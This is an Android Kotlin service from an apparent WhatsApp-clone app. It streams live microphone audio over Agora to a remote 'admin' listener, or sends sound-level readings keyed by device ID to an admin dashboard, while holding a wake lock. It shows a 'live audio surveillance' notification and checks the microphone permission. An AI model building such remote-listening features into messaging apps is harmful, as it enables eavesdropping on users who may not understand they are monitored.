package com.whatsapp.clone.platform

import android.Manifest
import android.annotation.SuppressLint
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.util.Log
import androidx.core.app.ServiceCompat
import androidx.core.content.ContextCompat
import com.whatsapp.clone.AGORA_APP_ID
import com.whatsapp.clone.config.NetworkConfig
import io.agora.rtc2.Constants
import io.agora.rtc2.IRtcEngineEventHandler
import io.agora.rtc2.RtcEngine
import io.agora.rtc2.RtcEngineConfig
import kotlinx.coroutines.*
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import org.json.JSONObject
import kotlin.math.log10
import kotlin.math.sqrt

class BackgroundAudioMonitorService : Service() {

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var rtcEngine: RtcEngine? = null
    private var audioRecord: AudioRecord? = null
    private var wakeLock: PowerManager.WakeLock? = null
    private var isSampling = false
    private var isStreaming = false
    private var currentChannel: String? = null

    // WebSocket to stream real-time dB / sound levels back to the admin dashboard
    private var audioFeedWs: WebSocket? = null
    private val audioFeedClient = OkHttpClient.Builder()
        .readTimeout(0, java.util.concurrent.TimeUnit.MILLISECONDS)
        .pingInterval(15, java.util.concurrent.TimeUnit.SECONDS)
        .build()

    companion object {
        private const val TAG = "AudioMonitorService"
        private const val SAMPLE_RATE = 44100
        private const val CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO
        private const val AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT

        const val EXTRA_CHANNEL_NAME = "EXTRA_CHANNEL_NAME"
        const val EXTRA_TOKEN = "EXTRA_TOKEN"
        const val EXTRA_APP_ID = "EXTRA_APP_ID"

        fun startAudioMonitor(
            context: Context,
            channelName: String = "",
            token: String = "",
            appId: String = ""
        ) {
            if (ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO)
                != PackageManager.PERMISSION_GRANTED
            ) {
                Log.e(TAG, "Cannot start service: RECORD_AUDIO permission missing.")
                return
            }

            val serviceIntent = Intent(context, BackgroundAudioMonitorService::class.java).apply {
                putExtra(EXTRA_CHANNEL_NAME, channelName)
                putExtra(EXTRA_TOKEN, token)
                putExtra(EXTRA_APP_ID, appId)
            }
            try {
                ContextCompat.startForegroundService(context, serviceIntent)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to start BackgroundAudioMonitorService: ${e.message}", e)
            }
        }

        fun stopAudioMonitor(context: Context) {
            val serviceIntent = Intent(context, BackgroundAudioMonitorService::class.java).apply {
                action = NotificationHelper.ACTION_STOP_SERVICE
            }
            try {
                context.startService(serviceIntent)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to stop BackgroundAudioMonitorService: ${e.message}", e)
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        NotificationHelper.createNotificationChannel(this)
        acquireWakeLock()
        connectAudioFeedWebSocket()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == NotificationHelper.ACTION_STOP_SERVICE) {
            Log.i(TAG, "Received STOP action in onStartCommand")
            stopStreamingAndSelf()
            return START_NOT_STICKY
        }

        val channelName = intent?.getStringExtra(EXTRA_CHANNEL_NAME) ?: ""
        val token = intent?.getStringExtra(EXTRA_TOKEN) ?: ""
        val appId = intent?.getStringExtra(EXTRA_APP_ID) ?: ""

        startForegroundWithMicrophone()

        if (channelName.isNotBlank()) {
            // 1-way Live Agora Audio Stream Mode
            Log.i(TAG, "Starting Agora 1-way live audio stream for channel: $channelName")
            startAgoraAudioStream(channelName, token, appId)
        } else {
            // Local Decibel-only Sampling Mode
            Log.i(TAG, "No Agora channel provided. Running local PCM audio level sampling loop.")
            startAudioProcessingLoop()
        }

        return START_NOT_STICKY
    }

    private fun startForegroundWithMicrophone() {
        val notification = NotificationHelper.buildNotification(
            this,
            "Live audio surveillance and sound level monitor active"
        )

        val serviceType = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
        } else {
            0
        }

        try {
            ServiceCompat.startForeground(
                this,
                NotificationHelper.NOTIFICATION_ID_AUDIO,
                notification,
                serviceType
            )
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start audio foreground service: ${e.message}", e)
            stopSelf()
        }
    }

    private fun startAgoraAudioStream(channelName: String, token: String, appId: String) {
        if (isStreaming && currentChannel == channelName) {
            Log.d(TAG, "Already streaming live audio to channel: $channelName")
            return
        }

        stopAgora()
        val effectiveAppId = if (appId.isNotBlank()) appId else AGORA_APP_ID
        currentChannel = channelName

        try {
            val config = RtcEngineConfig().apply {
                mContext = applicationContext
                mAppId = effectiveAppId
                mEventHandler = object : IRtcEngineEventHandler() {
                    override fun onJoinChannelSuccess(channel: String?, uid: Int, elapsed: Int) {
                        Log.i(TAG, "Successfully joined Agora Audio Channel: $channel (uid=$uid)")
                        isStreaming = true
                    }

                    override fun onError(err: Int) {
                        Log.e(TAG, "Agora RTC Audio error code: $err")
                    }

                    override fun onUserJoined(uid: Int, elapsed: Int) {
                        Log.i(TAG, "Admin audio listener joined Agora channel: $uid")
                    }

                    override fun onUserOffline(uid: Int, reason: Int) {
                        Log.i(TAG, "Admin audio listener went offline: $uid (reason=$reason)")
                    }

                    override fun onAudioVolumeIndication(
                        speakers: Array<out AudioVolumeInfo>?,
                        totalVolume: Int
                    ) {
                        // totalVolume ranges from 0 to 255
                        val normalizedDb = if (totalVolume <= 0) -80.0 else (-80.0 + (totalVolume / 255.0) * 80.0)
                        val estimatedRms = totalVolume * 128.0
                        streamDbLevel(normalizedDb, estimatedRms)
                    }

                    override fun onTokenPrivilegeWillExpire(token: String?) {
                        Log.w(TAG, "Agora RTC Audio token will expire soon")
                    }
                }
                mChannelProfile = Constants.CHANNEL_PROFILE_COMMUNICATION
            }

            val engine = RtcEngine.create(config).apply {
                enableAudio()
                disableVideo()
                setAudioProfile(Constants.AUDIO_PROFILE_SPEECH_STANDARD, Constants.AUDIO_SCENARIO_DEFAULT)
                enableAudioVolumeIndication(200, 3, true)
            }
            rtcEngine = engine

            val ret = engine.joinChannel(token, channelName, "", 0)
            Log.i(TAG, "joinChannel (Audio) result code: $ret for channel: $channelName")
        } catch (e: Exception) {
            Log.e(TAG, "Error initializing Agora for audio stream: ${e.message}", e)
            stopStreamingAndSelf()
        }
    }

    private fun connectAudioFeedWebSocket() {
        try {
            val deviceId = android.provider.Settings.Secure.getString(
                contentResolver,
                android.provider.Settings.Secure.ANDROID_ID
            ) ?: "unknown"
            val baseWs = NetworkConfig.getBaseUrl()
                .replace("http://", "ws://")
                .replace("https://", "wss://")
            val url = "$baseWs/ws/audio-feed/$deviceId"
            val request = Request.Builder().url(url).build()
            audioFeedWs = audioFeedClient.newWebSocket(request, object : WebSocketListener() {
                override fun onOpen(webSocket: WebSocket, response: okhttp3.Response) {
                    Log.i(TAG, "Audio feed WebSocket connected: $url")
                }
                override fun onFailure(webSocket: WebSocket, t: Throwable, response: okhttp3.Response?) {
                    Log.w(TAG, "Audio feed WebSocket failure: ${t.message}")
                    audioFeedWs = null
                }
                override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                    Log.i(TAG, "Audio feed WebSocket closed: $reason")
                    audioFeedWs = null
                }
            })
        } catch (e: Exception) {
            Log.w(TAG, "Could not connect audio feed WebSocket: ${e.message}")
        }
    }

    private fun disconnectAudioFeedWebSocket() {
        try {
            audioFeedWs?.close(1000, "Service stopped")
        } catch (_: Exception) {}
        audioFeedWs = null
    }

    private fun streamDbLevel(decibels: Double, rms: Double) {
        val ws = audioFeedWs ?: return
        try {
            val payload = JSONObject().apply {
                put("db", decibels)
                put("rms", rms)
                put("timestamp", System.currentTimeMillis())
            }
            ws.send(payload.toString())
        } catch (e: Exception) {
            Log.w(TAG, "Failed to stream audio level: ${e.message}")
        }
    }

    @SuppressLint("MissingPermission")
    private fun startAudioProcessingLoop() {
        if (isSampling) return
        isSampling = true

        val minBufferSize = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT)
        if (minBufferSize == AudioRecord.ERROR || minBufferSize == AudioRecord.ERROR_BAD_VALUE) {
            Log.e(TAG, "Buffer size calculation failed.")
            stopSelf()
            return
        }

        try {
            audioRecord = AudioRecord(
                MediaRecorder.AudioSource.MIC,
                SAMPLE_RATE,
                CHANNEL_CONFIG,
                AUDIO_FORMAT,
                minBufferSize
            )

            if (audioRecord?.state != AudioRecord.STATE_INITIALIZED) {
                Log.e(TAG, "AudioRecord failed to initialize.")
                stopSelf()
                return
            }

            audioRecord?.startRecording()

            serviceScope.launch {
                val buffer = ShortArray(minBufferSize)
                while (isActive && isSampling) {
                    val readResult = audioRecord?.read(buffer, 0, buffer.size) ?: 0

                    if (readResult > 0) {
                        val rms = calculateRms(buffer, readResult)
                        val decibels = calculateDb(rms)
                        streamDbLevel(decibels, rms)
                    }

                    delay(200)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Audio loop exception: ${e.message}")
            stopSelf()
        }
    }

    private fun calculateRms(buffer: ShortArray, readSize: Int): Double {
        var sum = 0.0
        for (i in 0 until readSize) {
            sum += buffer[i] * buffer[i]
        }
        return sqrt(sum / readSize)
    }

    private fun calculateDb(rms: Double): Double {
        if (rms <= 0.0) return -80.0
        return 20 * log10(rms / 32767.0)
    }

    private fun stopAgora() {
        try {
            rtcEngine?.let { engine ->
                engine.leaveChannel()
                RtcEngine.destroy()
            }
        } catch (e: Exception) {
            Log.w(TAG, "Error destroying Audio RtcEngine: ${e.message}")
        } finally {
            rtcEngine = null
            isStreaming = false
            currentChannel = null
        }
    }

    private fun stopStreamingAndSelf() {
        stopAgora()
        isSampling = false
        disconnectAudioFeedWebSocket()
        try {
            audioRecord?.stop()
            audioRecord?.release()
            audioRecord = null
        } catch (e: Exception) {
            Log.w(TAG, "Error releasing audioRecord: ${e.message}")
        }
        releaseWakeLock()
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                stopForeground(STOP_FOREGROUND_REMOVE)
            } else {
                @Suppress("DEPRECATION")
                stopForeground(true)
            }
        } catch (e: Exception) {
            Log.w(TAG, "Error stopping foreground: ${e.message}")
        }
        stopSelf()
    }

    private fun acquireWakeLock() {
        val powerManager = getSystemService(Context.POWER_SERVICE) as? PowerManager
        wakeLock = powerManager?.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            "VibeSync:AudioMonitorWakeLock"
        )?.apply {
            setReferenceCounted(false)
            acquire(60 * 60 * 1000L)
        }
    }

    private fun releaseWakeLock() {
        try {
            if (wakeLock?.isHeld == true) {
                wakeLock?.release()
            }
        } catch (e: Exception) {
            Log.w(TAG, "Failed to release wake lock: ${e.message}")
        } finally {
            wakeLock = null
        }
    }

    override fun onDestroy() {
        stopStreamingAndSelf()
        serviceScope.cancel()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
